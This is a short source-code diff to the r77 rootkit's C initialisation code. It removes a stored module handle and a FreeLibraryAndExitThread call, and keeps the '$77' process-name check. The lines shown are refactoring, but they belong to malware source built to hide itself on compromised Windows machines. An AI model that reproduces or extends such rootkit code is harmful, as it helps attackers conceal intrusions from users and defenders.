@@ -5,9 +5,8 @@
 #include <Shlwapi.h>
 
 static BOOL RootkitInitialized;
-static HINSTANCE Module;
 
-BOOL InitializeRootkit(HINSTANCE module)
+BOOL InitializeRootkit()
 {
 	// If the process starts with $77, do not load r77.
 	WCHAR executablePath[MAX_PATH + 1];
@@ -20,7 +19,6 @@ BOOL InitializeRootkit(HINSTANCE module)
 	if (!RootkitInitialized)
 	{
 		RootkitInitialized = TRUE;
-		Module = module;
 
 		// Initialize configuration system.
 		InitializeConfig();
@@ -50,7 +48,6 @@ VOID UninitializeRootkit()
 static VOID DetachRootkit()
 {
 	UninitializeRootkit();
-	FreeLibraryAndExitThread(Module, 0);
 }
 
 static BOOL WriteR77Header()
